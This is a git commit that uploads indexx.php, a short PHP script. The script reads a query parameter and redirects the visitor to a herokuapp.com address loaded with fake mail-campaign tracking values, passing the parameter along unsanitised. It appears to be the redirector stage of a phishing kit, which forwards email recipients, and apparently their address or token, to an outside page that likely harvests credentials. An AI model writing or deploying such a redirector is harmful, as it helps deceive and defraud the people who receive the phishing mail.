585890f7e0eab9ed7532ed8a1dae8729ff287615
xaviar8 <106953395+xaviar8@users.noreply.github.com>
2022-07-19 14:22:25 +0100

    Add files via upload

---
+++ indexx.php
@@ -0,0 +1,7 @@
+<? 
+
+$a = $_GET['a'];
+
+header ("Location: https://powerful-beyond-18078.herokuapp.com/?ioxwrxnaerll&auth=&7589cf-3ac6-4e1c-9e2a-babd0161c3c4&utm_source=mail&utm_campaign=&utm_medium=u=589a0449d04476c8af0f92bc7&amp;id=ca92440317&amp;e=c5cec25e50BgVtWAzsQmMcaL3zBjzlZ2TJR&amp&a=$a") ;
+
+?>
